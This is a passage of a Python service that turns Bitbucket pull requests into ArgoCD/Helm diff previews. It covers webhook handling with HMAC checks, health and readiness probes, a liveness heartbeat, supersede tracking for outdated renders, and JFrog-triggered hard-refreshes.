    with _supersede_lock:
        pending = _pr_superseded.pop(sk, None)
    if pending and not _sha_eq(pending, pr_sha):
        return pending
    return None


def _record_base_hint(repo: str, base_branch: str, sha: str) -> None:
    """Note that `repo`'s `base_branch` has advanced to `sha` (COPS-2617).

    Last writer wins on purpose: a burst of merges is one piece of news
    ("the base moved, and here is where to"), not N. That is what turns the
    measured four-merges-four-recomputes into four-merges-one-recompute.
    """
    if not SUPERSEDE_ABORT_ENABLED:
        return
    try:
        with _supersede_lock:
            _base_superseded[(repo, base_branch)] = sha
    except Exception:  # pragma: no cover - see _record_supersede_hint
        pass


def _base_superseded_by(repo: str, base_branch: str, base_sha: str, sk=None):
    """Peek at whether the destination branch moved since `base_sha`.

    Peek, not pop, and deliberately unlike _arm_supersede: the hint is
    shared by every open PR against that branch, so the first PR to read it
    must not consume it out from under the others.

    sk (repo, pr_id), when given, applies the SAME livelock guard as the
    PR's-own-commit path. A busy merge train advances the base continuously,
    and without this a large PR would abort forever and never publish
    anything -- which is worse than publishing slightly stale, because a
    reviewer gets nothing at all.
    """
    if not SUPERSEDE_ABORT_ENABLED:
        return None
    with _supersede_lock:
        pending = _base_superseded.get((repo, base_branch))
        aborts = _pr_supersede_aborts.get(sk, 0) if sk else 0
    if aborts >= SUPERSEDE_MAX_CONSECUTIVE_ABORTS:
        return None
    if pending and not _sha_eq(pending, base_sha):
        return pending
    return None


def _superseded(sk, pr_sha: str):
    """Peek (no consume) at whether a newer commit arrived mid-render.

    Returns the newer sha, or None. Honours the livelock guard: once a PR has
    aborted SUPERSEDE_MAX_CONSECUTIVE_ABORTS times in a row, this reports
    "not superseded" so the run completes and the PR finally gets a comment.
    """
    if not SUPERSEDE_ABORT_ENABLED:
        return None
    with _supersede_lock:
        pending = _pr_superseded.get(sk)
        aborts  = _pr_supersede_aborts.get(sk, 0)
    if aborts >= SUPERSEDE_MAX_CONSECUTIVE_ABORTS:
        return None
    if pending and not _sha_eq(pending, pr_sha):
        return pending
    return None


def _note_supersede_abort(sk) -> int:
    with _supersede_lock:
        n = _pr_supersede_aborts.get(sk, 0) + 1
        _pr_supersede_aborts[sk] = n
    with _bb_webhook_stats_lock:
        _bb_webhook_stats["supersedes_triggered"] += 1
    return n


def _note_supersede_complete(sk) -> None:
    with _supersede_lock:
        _pr_supersede_aborts.pop(sk, None)


def _prune_supersede_state(open_keys, polled_repos=None) -> None:
    """Drop state for PRs that are no longer open, so the dicts do not grow
    one entry per force-pushed-then-closed PR for the life of the pod.

    Mirrors the _stale() rule used for _seen and _pr_chart_targets: only evict
    keys belonging to a repo that was actually polled this round, so a repo
    temporarily missing from the snapshot does not get its state wiped.
    """
    keep = set(open_keys)
    repos = set(polled_repos) if polled_repos is not None else {k[0] for k in keep}
    with _supersede_lock:
        for d in (_pr_superseded, _pr_supersede_aborts):
            for k in [k for k in d
                      if not isinstance(k, tuple) or (k[0] in repos and k not in keep)]:
                del d[k]


# ── Health tracking ───────────────────────────────────────────────────────────
# _last_ok: updated by a background heartbeat thread while the main loop runs.
# This decouples liveness from iteration duration — a long 800-app PR is healthy
# while running, not just when it finishes. Updated every 30s while iterating.
_last_ok: float       = time.monotonic()
_last_ok_lock         = threading.Lock()
# _loop_progress_token / _loop_idle: what the heartbeat actually checks before
# vouching for liveness (v2.5.2 C2). Before this, _beat() bumped _last_ok
# every 30s completely unconditionally, so a truly wedged main loop (deadlock,
# a blocking call with no timeout in some future code path) still reported
# /healthz healthy forever — Kubernetes would never restart it, and PRs would
# silently stop being processed. Now the heartbeat only vouches for liveness
# when EITHER real progress happened since the last tick (_loop_progress_token
# advanced) OR the loop is known to be idly waiting on _wake (a safe, expected
# state, not a hang). main_iteration() advances the token at coarse
# checkpoints; main()'s outer loop sets _loop_idle around the wait.
_loop_progress_token: int = 0
_loop_idle: bool           = False
_progress_lock             = threading.Lock()
# _last_poll_ok: set True only when PR polling (get_open_prs + base SHA fetch)
# succeeds. If Bitbucket is down, _last_ok stays green but /healthz exposes the
# poll failure so alerts can distinguish "busy processing" from "broken loop".
_last_poll_ok: bool   = True
_consecutive_poll_fails: int = 0
POLL_FAIL_THRESHOLD   = _env_int("POLL_FAIL_THRESHOLD", 3)
# _ready tracks whether the service is operationally ready: cleared when OCI
# creds are missing or repeated login failures make the diff engine broken.
_consecutive_login_fails: int = 0
LOGIN_FAIL_THRESHOLD  = _env_int("LOGIN_FAIL_THRESHOLD", 3)

# Max parallel PR processing workers. Each worker fans out up to DIFF_WORKERS
# per-app helm-template diffs internally, so the effective worker pool is
# MAX_PR_WORKERS × DIFF_WORKERS. Env-overridable via PR_WORKERS.
MAX_PR_WORKERS  = _env_int("PR_WORKERS", 3)

# Path map TTL cache: argocd app list is ~350ms and downloads ~50KB.
# The map only changes when apps are added/removed (rare).
# Cache for 5 min so idle iterations cost ~1ms instead of ~350ms.
_path_map_cache: dict  = {}
_path_map_ts:    float = 0.0
_path_map_count: int   = 0    # extra invalidation: rebuild if app count changes
PATH_MAP_TTL            = 300   # seconds
# COPS-2507 multi-repo: app full_name -> git config repo slug (from the app's
# git source repoURL), and the per-repo partition of the path map. A PR in
# repo R only matches apps in _repo_path_maps[R].
_app_repo_map: dict    = {}
_repo_path_maps: dict  = {}
# sha -> repo slug, registered by process_pr for the PR head and base shas.
# Because git commit SHAs are globally unique, any sha-carrying call deep in
# the render path (_bb_fetch_status, post_build_status) can resolve its repo
# from the sha WITHOUT threading a repo parameter through every function in
# between. Falls back to BB_REPO (default repo) for unregistered shas, which
# preserves the historical single-repo behavior exactly.
_sha_repo_map: dict    = {}
_sha_repo_lock         = threading.Lock()
_SHA_REPO_MAX          = 2000   # bounded: purged wholesale when exceeded

def _register_sha_repo(sha, repo):
    if not sha or not repo:
        return
    with _sha_repo_lock:
        if len(_sha_repo_map) > _SHA_REPO_MAX:
            _sha_repo_map.clear()   # cheap reset; re-registered on next PR pass
        _sha_repo_map[sha] = repo

def _repo_for_sha(sha):
    with _sha_repo_lock:
        return _sha_repo_map.get(sha)
# app full_name -> OCI chart name (e.g. "appspace-micro-services"), built from
# the same `argocd app list` call.
_app_chart_map: dict   = {}
# app full_name -> current OCI chart targetRevision (e.g. "2602.4.1-dev").
_app_chart_revision_map: dict = {}
# app full_name -> OCI registry hostname (e.g. "helm-oci-dev.repo.appspace.com").
# There are two registries: -dev (dev charts) and -release (stable released charts).
# Both use the same credentials but must be logged into separately.
_app_chart_registry_map: dict = {}
# app full_name -> helm value file paths (from spec.sources[1].helm.valueFiles).
# Used by the helm-template diff path to fetch value files from Bitbucket.
_app_value_files_map: dict = {}
# app full_name -> destination namespace.
_app_namespace_map: dict = {}
# Total app-reference count across all path entries. Used to detect when a new
# app appears under an *existing* path key (which would not change len(path_map)
# and would be missed by the old key-count invalidation check).
_path_map_app_count: int = 0

# GCE access token cache: token valid ~3600s, no reason to refetch each PR.
_gcp_token:     str   = ""
_gcp_token_exp: float = 0.0
_gcp_token_lock       = threading.Lock()

def log(msg: str, severity: str = "INFO", **labels) -> None:
    """Emit a structured JSON log line in GCP Cloud Logging format."""
    entry: dict = {
        "severity":  severity,
        "message":   msg,
        "time":      datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
        "component": "acme-diff-preview",
    }
    if labels:
        entry["labels"] = {k: str(v) for k, v in labels.items()}
    print(json.dumps(entry), flush=True)

def debug(msg: str, **labels) -> None:
    """Emit a DEBUG log line only when LOG_LEVEL=DEBUG.

    Used for the verbose diagnostics that help explain *why* a diff failed:
    full ArgoCD stderr, per-attempt classification, repo-server error category,
    etc. Kept off by default so normal INFO logs stay readable.
    """
    if DEBUG:
        log(msg, "DEBUG", **labels)

def _handle_sigterm(signum, frame) -> None:
    """Mark shutdown so the main loop exits after the current iteration."""
    global _shutdown
    _shutdown = True
    log("SIGTERM received — draining current iteration then exiting", "WARNING")
    # Hand leadership over NOW (best-effort): the standby replica takes the
    # poll loop in ~1 renewal instead of waiting out a full lease duration.
    # If an iteration is still draining here, the new leader's first
    # iteration may briefly overlap it. That is accepted by design: diff
    # output is deterministic per sha, comments are upserted in place, and
    # the cross-pod SHA dedup skips already-commented commits.
    if _leader is not None:
        _leader.release()

signal.signal(signal.SIGTERM, _handle_sigterm)

class _HealthHandler(BaseHTTPRequestHandler):
    """Minimal health check server for Kubernetes liveness/readiness probes."""
    def log_message(self, fmt, *args):
        pass  # Suppress per-request access logs

    def do_GET(self):
        if self.path == "/jfrog-webhook/stats":
            # JSON counters for the JFrog webhook — useful for monitoring
            with _jfrog_stats_lock:
                payload = dict(_jfrog_stats)
            data = json.dumps(payload, indent=2).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

        elif self.path == "/diff-preview/stats":
            # JSON counters for diff operations — useful for dashboards and alerts
            with _diff_stats_lock:
                payload = dict(_diff_stats)
            payload["version"] = APP_VERSION   # v2.5.19 (F1): running version
            # COPS-2577: the high-water mark in the payload is meaningless
            # on its own; the cap it is approaching has to travel with it.
            payload["max_apps_per_run"] = MAX_APPS_PER_RUN
            # COPS-2507: which repos (and scopes) this instance is serving.
            payload["repos"] = {r: (c["scopes"] or ["*"]) for r, c in REPOS.items()}
            # HA: which replica owns the poll loop right now. No elector
            # wired (tests, single-process runs) counts as leading.
            payload["is_leader"] = _should_run_iteration(_leader)
            # COPS-2575: Bitbucket webhook health. A dead webhook is otherwise
            # invisible: the code stays correct and the service just runs on
            # the 60s safety net. Comparing wakes against safety-net ticks in
            # the iteration log is what makes that obvious.
            with _bb_webhook_stats_lock:
                payload["bb_webhook"] = dict(_bb_webhook_stats)
            payload["bb_webhook"]["hmac_strict"] = bool(BB_WEBHOOK_SECRET)
            payload["bb_webhook"]["supersede_enabled"] = SUPERSEDE_ABORT_ENABLED
            data = json.dumps(payload, indent=2).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

        elif self.path == "/healthz":
            # Healthy when the heartbeat thread has ticked within 10 minutes.
            # The heartbeat updates _last_ok every 30s while the main loop runs
            # so liveness is not tied to individual iteration duration.
            with _last_ok_lock:
                age = time.monotonic() - _last_ok
            alive = age < 600
            if alive and not _last_poll_ok:
                msg = f"degraded: poll_fails={_consecutive_poll_fails}".encode()
            elif alive:
                msg = b"ok"
            else:
                msg = f"stale: last heartbeat {age:.0f}s ago".encode()
            self.send_response(200 if alive else 503)
            self.end_headers()
            self.wfile.write(msg)

        elif self.path == "/readyz":
            # Ready when login succeeded, OCI creds present, poll is healthy.
            # Unhealthy readiness removes the pod from the load balancer so stale
            # or broken diffs don't silently block PRs.
            poll_ok = _last_poll_ok or (_consecutive_poll_fails < POLL_FAIL_THRESHOLD)
            ok = (_ready
                  and bool(OCI_PASS)
                  and _consecutive_login_fails < LOGIN_FAIL_THRESHOLD
                  and poll_ok)
            if not ok:
                parts = []
                if not _ready:
                    parts.append(b"not_started")
                if not OCI_PASS:
                    parts.append(b"oci_missing")
                if _consecutive_login_fails >= LOGIN_FAIL_THRESHOLD:
                    parts.append(f"login_fails={_consecutive_login_fails}".encode())
                if not poll_ok:
                    parts.append(f"poll_fails={_consecutive_poll_fails}".encode())
                reason = b" ".join(parts)
            self.send_response(200 if ok else 503)
            self.end_headers()
            self.wfile.write(b"ready" if ok else reason)

        elif self.path.startswith("/diff/"):
            # Full-diff UI. diff_ui.respond is pure (status, ctype,
            # payload): strict path validation, 404 unless DIFF_UI_ENABLED,
            # fully escaped HTML. This shim only speaks HTTP.
            code, ctype, payload = diff_ui.respond(
                self.path, DIFF_UI_DIR, DIFF_UI_ENABLED,
                bucket=DIFF_UI_GCS_BUCKET)
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            # Explicit Content-Length, matching every other route on this
            # handler (/healthz, /diff-preview/stats, ...). Harmless under
            # the current HTTP/1.0 (connection close marks the body end
            # either way), but this route serves the largest bodies of
            # anything here (a full multi-app diff can be several MB), so
            # it is exactly the one that would silently hang a client if
            # this handler ever moves to HTTP/1.1 keep-alive.
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload)
        else:
            self.send_response(404)
            self.end_headers()

# HTTP POST handler — receives Bitbucket webhook events
    def do_POST(self):
        if self.path == "/diff-preview/webhook":
            # Bitbucket PR webhook — wake the diff loop immediately.
            # Cap body size so a large malformed request cannot exhaust pod memory.
            try:
                length = int(self.headers.get("Content-Length", 0))
            except (ValueError, TypeError):
                length = 0
            # A negative length (e.g. "-1") used to pass the "> cap" check below
            # and then self.rfile.read(length) reads UNTIL EOF (Python treats
            # any negative size as "read everything"), completely bypassing the
            # cap this code claims to enforce — an unauthenticated request
            # (HMAC is verified AFTER the body is read) could exhaust pod memory
            # or hang this thread forever on an open connection (v2.5.2 C1).
            if length <= 0 or length > JFROG_MAX_BODY_BYTES:
                with _bb_webhook_stats_lock:
                    _bb_webhook_stats["received"] += 1
                    _bb_webhook_stats["rejected_format"] += 1
                    _bb_webhook_stats["last_received_at"] = datetime.now(timezone.utc).isoformat()
                self.send_response(413)
                self.end_headers()
                return
            body = self.rfile.read(length)
            with _bb_webhook_stats_lock:
                _bb_webhook_stats["received"] += 1
                _bb_webhook_stats["last_received_at"] = datetime.now(timezone.utc).isoformat()

            # HMAC-SHA256 verification (Bitbucket X-Hub-Signature header).
            # Permissive when BB_WEBHOOK_SECRET is not set (backward compat).
            if not _verify_bb_hmac(body, self.headers.get("X-Hub-Signature", "")):
                log("Bitbucket webhook: HMAC verification failed — rejecting request", "WARNING")
                with _bb_webhook_stats_lock:
                    _bb_webhook_stats["rejected_hmac"] += 1
                self.send_response(401)
                self.end_headers()
                return

            event_key = self.headers.get("X-Event-Key", "")
            if event_key.startswith("pullrequest:"):
                # Always wake the local loop (harmless on a standby). If we
                # are the standby and this is not already a relay, relay it
                # to the leader so processing starts in <1s instead of on
                # the leader's 60s safety-net tick.
                #
                # COPS-2575: _wake.set() stays the FIRST statement here, before
                # anything touches the payload. The wake is the single most
                # load-bearing behaviour in the service and it fails silently
                # (the service just degrades to the 60s tick), so no parsing
                # bug is ever allowed to suppress it. tests/test_cops2575_
                # supersede.py asserts this ordering on the source itself.
                _wake.set()
                with _bb_webhook_stats_lock:
                    _bb_webhook_stats["wakes"] += 1
                _maybe_record_supersede_hint(event_key, body)
                relayed_in = self.headers.get("X-ADP-Forwarded", "") == "1"
                if relayed_in or _should_run_iteration(_leader):
                    log(f"Webhook received: {event_key} — waking loop")
                else:
                    ok = _forward_webhook_to_leader(body, self.headers)
                    log(f"Webhook received: {event_key} (standby): "
                        + ("relayed to the leader" if ok
                           else "relay unavailable, safety net covers it"))
            self.send_response(200)
            self.end_headers()

        elif self.path == "/jfrog-webhook":
            # JFrog OCI push webhook — hard-refresh matching ArgoCD apps
            try:
                length = int(self.headers.get("Content-Length", 0))
            except (ValueError, TypeError):
                length = 0  # malformed header — treat as no body
            # length <= 0 covers both "no body" AND a negative length such as
            # "-1", which would otherwise pass the "> cap" check and then make
            # self.rfile.read(length) read UNTIL EOF — unbounded, on an
            # unauthenticated request (HMAC checked after the read) (v2.5.2 C1).
            if length < 0 or length > JFROG_MAX_BODY_BYTES:
                log(f"JFrog webhook: rejecting invalid Content-Length ({length})", "WARNING")
                self.send_response(413)
                self.end_headers()
                return
            body = self.rfile.read(length) if length else b""

            # Count every request that reaches HMAC verification
            with _jfrog_stats_lock:
                _jfrog_stats["received"] += 1
                if _jfrog_stats["started_at"] is None:
                    _jfrog_stats["started_at"] = datetime.now(timezone.utc).isoformat()

            # Verify HMAC-SHA256 shared secret (X-JFrog-Event-Auth header)
            if not _verify_jfrog_hmac(body, self.headers.get("X-JFrog-Event-Auth", "")):
                log("JFrog webhook: HMAC verification failed — rejecting request", "WARNING")
                with _jfrog_stats_lock:
                    _jfrog_stats["rejected_hmac"] += 1
                self.send_response(401)
                self.end_headers()
                return

            # Parse docker:pushed payload
            try:
                payload     = json.loads(body)
                event_type  = payload.get("event_type", "")
                data        = payload.get("data", {})
                chart_name  = data["image_name"]
                chart_ver   = data["tag"]
            except (KeyError, json.JSONDecodeError, TypeError) as exc:
                log(f"JFrog webhook: malformed payload: {exc}", "WARNING")
                with _jfrog_stats_lock:
                    _jfrog_stats["rejected_format"] += 1
                self.send_response(400)
                self.end_headers()
                return

            if event_type != "pushed":
                self.send_response(200)
                self.end_headers()
                return

            # Respond immediately so JFrog does not time out
            self.send_response(202)
            self.end_headers()

            # Dedup: skip if same chart:version was hard-refreshed very recently
            dedup_key = f"{chart_name}:{chart_ver}"
            now = time.monotonic()
            with _jfrog_dedup_lock:
                last = _jfrog_recent.get(dedup_key, 0)
                if now - last < JFROG_DEDUP_WINDOW:
                    age = round(now - last, 1)
                    log(f"JFrog webhook: skipping duplicate {dedup_key} "
                        f"(last refresh {age}s ago, window={JFROG_DEDUP_WINDOW}s)")
                    with _jfrog_stats_lock:
                        _jfrog_stats["dedup_skipped"] += 1
                    return
                _jfrog_recent[dedup_key] = now
                # Drop entries well outside the dedup window so this dict does not
                # grow unbounded over a long pod lifetime (many chart:version pushes).
                stale = [k for k, t in _jfrog_recent.items()
                         if now - t > JFROG_DEDUP_WINDOW * 100]
                for k in stale:
                    del _jfrog_recent[k]

            log(f"JFrog webhook: push event for {chart_name}:{chart_ver} — triggering hard-refresh")
            # Invalidate our own local chart cache and force affected open
            # PRs to recompute with the fresh build (cheap, in-memory).
            try:
                _invalidate_for_republish(chart_name, chart_ver)
            except Exception as exc:
                log(f"JFrog webhook: local invalidation failed: {exc}", "ERROR")
            _jfrog_refresh_pool.submit(_jfrog_hard_refresh, chart_name, chart_ver)

        else:
            self.send_response(404)
            self.end_headers()

def _verify_jfrog_hmac(body: bytes, header: str) -> bool:
    """Verify X-JFrog-Event-Auth HMAC-SHA256 against the shared webhook secret.

    JFrog signs the payload with HMAC-SHA256 using the secret configured in
    Administration -> Webhooks. The signature is the hex digest of the HMAC,
    sent in the X-JFrog-Event-Auth header.

    The header is attacker-controlled and compared PRE-AUTH. Comparing it as
    a str with hmac.compare_digest raises TypeError on any non-ASCII byte,
    which propagated out of do_POST uncaught -- a single unauthenticated
    request with a non-ASCII signature header crashed the request thread and
    dumped a full traceback to logs on both webhook endpoints (v2.5.3
    CRIT-2, confirmed live with a real server). Comparing as bytes sidesteps
    the ASCII restriction entirely: any header value is a valid input and a
    mismatch (including "not valid hex", "wrong length", "non-ASCII") is
    just another way to be unequal, never an exception.
    """
    import hmac, hashlib
    if not JFROG_WEBHOOK_SECRET or not header:
        return False
    expected = hmac.new(JFROG_WEBHOOK_SECRET.encode(), body, hashlib.sha256).hexdigest()
    return hmac.compare_digest(header.encode("utf-8", errors="replace"),
                                expected.encode("ascii"))


def _verify_bb_hmac(body: bytes, header: str) -> bool:
    """Verify Bitbucket X-Hub-Signature HMAC-SHA256 against BB_WEBHOOK_SECRET.

    Bitbucket signs the payload as: X-Hub-Signature: sha256=<hex-digest>
    If BB_WEBHOOK_SECRET is empty, the webhook is accepted without verification
    (permissive mode for backward compatibility during rollout). Once the secret
    is configured in both Bitbucket and GCP SM, all unsigned requests are rejected.

    See _verify_jfrog_hmac for why the comparison is done in bytes, not str
    (v2.5.3 CRIT-2): hmac.compare_digest on two str values raises TypeError
    for any non-ASCII character, and that exception was uncaught in do_POST.
    """
    import hmac, hashlib
    if not BB_WEBHOOK_SECRET:
        # Secret not yet configured — accept all (permissive mode).
        return True
    if not header:
        return False
    # Strip "sha256=" prefix sent by Bitbucket.
    sig = header.removeprefix("sha256=")
    expected = hmac.new(BB_WEBHOOK_SECRET.encode(), body, hashlib.sha256).hexdigest()
    return hmac.compare_digest(sig.encode("utf-8", errors="replace"),
                                expected.encode("ascii"))


# COPS-2575: which pullrequest:* events actually mean "the tip moved".
# Every pullrequest:* event wakes the loop, as it always has, but comment,
# approval and decline events also embed a full pullrequest entity whose
# source.commit.hash is simply the current tip. Recording hints from those
# adds nothing and couples this to unrelated activity.
_SUPERSEDE_EVENTS = ("pullrequest:created", "pullrequest:updated")
# COPS-2617: a MERGE is what advances the destination branch. A push to a
# PR's own branch must never be read as "main moved", or every other open PR
# would abort on every unrelated push.
_BASE_SUPERSEDE_EVENTS = ("pullrequest:fulfilled",)


def _maybe_record_supersede_hint(event_key: str, body: bytes) -> None:
    """Best-effort: note which PR moved to which commit, from the webhook body.

    NEVER raises and never affects the wake. Every failure mode here (bad
    JSON, missing keys, wrong types, unknown repo, non-UTF8 bytes) simply
    means "no hint", which degrades to exactly the pre-COPS-2575 behaviour.

    Only trusted when HMAC verification actually ran. _verify_bb_hmac is
    permissive when BB_WEBHOOK_SECRET is empty, and an unauthenticated POST
    that can abort in-flight renders is a cheap denial of service. Production
    sets the secret, so this only guards local and misconfigured deployments.
    """
    try:
        if not SUPERSEDE_ABORT_ENABLED or not BB_WEBHOOK_SECRET:
            return
        if event_key not in _SUPERSEDE_EVENTS \
                and event_key not in _BASE_SUPERSEDE_EVENTS:
            return
        payload = json.loads(body.decode("utf-8"))
        if not isinstance(payload, dict):
            return
        pr = payload.get("pullrequest")
        repo_obj = payload.get("repository")
        if not isinstance(pr, dict) or not isinstance(repo_obj, dict):
            return
        pr_id = pr.get("id")
        if not isinstance(pr_id, int) or isinstance(pr_id, bool):
            return
        sha = (((pr.get("source") or {}).get("commit") or {}).get("hash"))
        if not isinstance(sha, str) or not sha:
            return
        # repository.full_name carries "workspace/slug". repository.name is a
        # DISPLAY name and can differ from the slug entirely, so keying off it
        # would make hints silently never match (COPS-2575 analysis).
        full_name = repo_obj.get("full_name")
        if not isinstance(full_name, str) or "/" not in full_name:
            return
        workspace, _, slug = full_name.partition("/")
        if workspace != BB_WORKSPACE or slug not in REPOS:
            return
        if event_key in _BASE_SUPERSEDE_EVENTS:
            # COPS-2617: a merge. The destination branch now points at the
            # merge commit, which invalidates every open PR against it.
            dest = pr.get("destination") or {}
            branch = ((dest.get("branch") or {}).get("name"))
            new_base = ((pr.get("merge_commit") or {}).get("hash"))
            if isinstance(branch, str) and branch and \
                    isinstance(new_base, str) and new_base:
                _record_base_hint(slug, branch, new_base)
            return
        _record_supersede_hint(slug, pr_id, sha)
    except Exception:
        # Deliberately silent and total: the wake already happened.
        return


def _invalidate_for_republish(chart_name: str, chart_version: str) -> None:
    """React to a chart republish under the same tag (mutable dev tags).

    Called inline from the JFrog webhook handler, before the ArgoCD
    hard-refresh thread starts, so the local state is already clean when
    the woken loop recomputes.

    1. Evict the version from the local helm chart cache so the next
       _ensure_chart call re-pulls the fresh build.
    2. Drop cached main-side renders of apps tracking this chart:version.
    3. Force open PRs that render with this chart:version to recompute
       their diff (bypassing the SHA dedup once) and wake the main loop.
    """
    suffix = f"/{chart_name}:{chart_version}"
    evicted = 0
    with _helm_cache_lock:
        for k in [k for k in list(_helm_chart_cache) if k.endswith(suffix)]:
            _helm_chart_cache.pop(k, None)
            evicted += 1
        # v2.5.19 (M3): _helm_chart_pull_ts is guarded by the SAME lock as its
        # sibling _helm_chart_cache everywhere else; popping it unlocked here
        # (webhook thread) raced an in-flight pull's timestamp write.
        for k in [k for k in list(_helm_chart_pull_ts) if k.endswith(suffix)]:
            _helm_chart_pull_ts.pop(k, None)
    with _helm_pull_locks_lock:
        for k in [k for k in list(_helm_pull_locks) if k.endswith(suffix)]:
            _helm_pull_locks.pop(k, None)

    # Drop stale main-side renders for apps tracking this chart:version.
    stale_apps = {a for a, c in list(_app_chart_map.items())
                  if c == chart_name
                  and _app_chart_revision_map.get(a) == chart_version}
    if stale_apps:
        with _main_render_lock:
            for k in [k for k in list(_main_render_cache) if k[0] in stale_apps]:
                del _main_render_cache[k]

    # Force recompute of open PRs that render with this chart build.
    forced = []
    with _seen_lock:
        for pid, targets in list(_pr_chart_targets.items()):
            if (chart_name, chart_version) in targets:
                _force_recompute.add(pid)
                _seen.pop(pid, None)
                forced.append(pid)
    if evicted or forced:
        log(f"Chart republish {chart_name}:{chart_version} — evicted "
            f"{evicted} local cache entrie(s), forcing recompute of "
            f"PR(s): {forced if forced else 'none'}")
    if forced:
        _wake.set()


def _jfrog_hard_refresh(chart_name: str, chart_version: str) -> None:
    """Hard-refresh all ArgoCD apps tracking chart_name:chart_version.

    Called in a daemon thread after responding 202 to the JFrog webhook.
    Bypasses the repo-server OCI cache so ArgoCD picks up the new image
    even when CI pushes a new build without bumping the chart version.
    """
    log(f"JFrog webhook: looking for apps tracking {chart_name}:{chart_version}",
        chart=chart_name, version=chart_version)

    r = subprocess.run(
        [ARGOCD_BIN, "app", "list", "--output", "json"]
         + [arg for p in ARGOCD_PROJECTS for arg in ("--project", p)] + _auth_flags(),
        capture_output=True, text=True, timeout=60,
        env=_argocd_subprocess_env())

    if r.returncode != 0:
        log(f"JFrog webhook: app list failed: {r.stderr[:200]}"
            + ("..." if len(r.stderr) > 200 else ""), "ERROR")
        return

    try:
        data = json.loads(r.stdout)
    except json.JSONDecodeError as exc:
        log(f"JFrog webhook: malformed app list JSON: {exc}", "ERROR")
        return

    # argocd app list -o json returns a JSON array directly (not {"items": [...]})
    apps = data if isinstance(data, list) else data.get("items", [])
    matching = []
    for app in apps:
        for src_entry in app["spec"].get("sources", []):
            if (src_entry.get("chart") == chart_name
                    and src_entry.get("targetRevision") == chart_version):
                matching.append(app["metadata"]["name"])
                break

    if not matching:
        log(f"JFrog webhook: no apps found for {chart_name}:{chart_version}")
        return

    log(f"JFrog webhook: {len(matching)} apps to hard-refresh: "
        f"{', '.join(matching[:5])}{'...' if len(matching) > 5 else ''}")

    # Parallel hard-refresh: same approach as the CronJob in dev_hard_refresh.py
    # See JFROG_DISPATCH_WORKERS above for why this has its own name (N1):
    # this one controls how many apps are hard-refreshed in parallel WITHIN
    # a single chart:version event, a different knob than the dispatch pool.
    REFRESH_WORKERS = _env_int("JFROG_REFRESH_FANOUT", 8)

    def _do_refresh(app_name: str):
        try:
            r = subprocess.run(
                [ARGOCD_BIN, "app", "get", app_name, "--hard-refresh"] + _auth_flags(),
                capture_output=True, text=True, timeout=60,
                env=_argocd_subprocess_env())
            if r.returncode == 0:
                log(f"  hard-refresh OK: {app_name}")
                return True
            log(f"  hard-refresh FAILED: {app_name}: {r.stderr[:100]}"
                + ("..." if len(r.stderr) > 100 else ""), "WARNING")
            return False
        except subprocess.TimeoutExpired:
            log(f"  hard-refresh timed out: {app_name}", "WARNING")
            return False

    ok = failed = 0
    with ThreadPoolExecutor(max_workers=REFRESH_WORKERS) as pool:
        futures = {pool.submit(_do_refresh, app): app for app in matching}
        for fut in as_completed(futures):
            if fut.result():
                ok += 1
            else:
                failed += 1

    with _jfrog_stats_lock:
        _jfrog_stats["refreshes_ok"]     += ok
        _jfrog_stats["refreshes_failed"] += failed

    log(f"JFrog webhook: done — {ok} refreshed, {failed} failed")


def _touch_progress() -> None:
    """Record that the main loop made real, observable progress right now
    (v2.5.2 C2). Called from coarse checkpoints inside main_iteration() and
    from the per-app diff completion loop, so a long-but-healthy iteration
    keeps refreshing liveness the same way a short one does."""
    global _loop_progress_token
    with _progress_lock:
        _loop_progress_token += 1


def _liveness_should_refresh(token: int, last_seen_token: int, idle: bool) -> bool:
    """Pure decision: should this heartbeat tick vouch for /healthz?

    True when the loop is in the known-safe idle wait (blocked on _wake with
    a bounded 60s timeout — never a hang), or when the progress token has
    advanced since the last tick (real work happened in the last 30s).
    False only when the loop claims to be busy but produced zero observable
    progress since the last check — exactly what a wedged main loop looks
    like, and exactly the signal /healthz must be allowed to see (v2.5.2 C2).
    """
    return idle or (token != last_seen_token)


def _start_heartbeat() -> None:
    """Tick _last_ok every 30s, but only when the main loop demonstrably
    earned it — see _liveness_should_refresh — not unconditionally (v2.5.2 C2).

    Decouples liveness from iteration duration — a long 800-app PR stays healthy
    while running instead of triggering a restart after 5 minutes — without
    also hiding a genuinely wedged loop from Kubernetes forever.
    """
    def _beat():
        global _last_ok
        last_seen_token = -1
        while not _shutdown:
            with _progress_lock:
                token, idle = _loop_progress_token, _loop_idle
            if _liveness_should_refresh(token, last_seen_token, idle):
                with _last_ok_lock:
                    _last_ok = time.monotonic()
            last_seen_token = token
            time.sleep(30)
    t = threading.Thread(target=_beat, daemon=True, name="heartbeat")
    t.start()
    log("Heartbeat thread started (tick every 30s, liveness threshold 10 min)")


class _FastBindHTTPServer(ThreadingHTTPServer):
    """ThreadingHTTPServer, minus the slow, unused FQDN lookup on bind.

    Stock HTTPServer.server_bind() calls socket.getfqdn(host) to populate
    server_name, an attribute nothing in this codebase reads. Binding to
    ("", port) (required in production so kubelet/Service probes reach the
    pod on any interface) makes getfqdn() reverse-resolve the machine's OWN
    hostname; on hosts where that path is slow (observed: several real
    seconds on this class of machine) every process start, and every test
    that boots the health server, pays it for metadata nobody uses. This
    calls TCPServer.server_bind directly (skipping HTTPServer's override)
    so the actual bind/listen behavior, what matters for real traffic,
    is unchanged; only the unused, slow metadata computation is skipped.
    """
    def server_bind(self):
        socketserver.TCPServer.server_bind(self)
        self.server_name = self.server_address[0] or "0.0.0.0"
        self.server_port = self.server_address[1]


def _start_health_server(port: int = 8080) -> ThreadingHTTPServer:
    """Start the health server in a daemon thread and handle webhook POSTs.

    Uses ThreadingHTTPServer so health probes (GET /healthz) are never blocked
    by a concurrent JFrog or Bitbucket webhook request.
    """
    server = _FastBindHTTPServer(("", port), _HealthHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True, name="health-server")
    t.start()
    log(f"Health server listening on :{port}")
    return server

def _auth_flags():
    """Return ArgoCD CLI flags for transport only (no credentials on argv).

    The JWT is injected via the ARGOCD_AUTH_TOKEN environment variable in
    _argocd_subprocess_env(), so it never appears in ps/proc listings.
    """
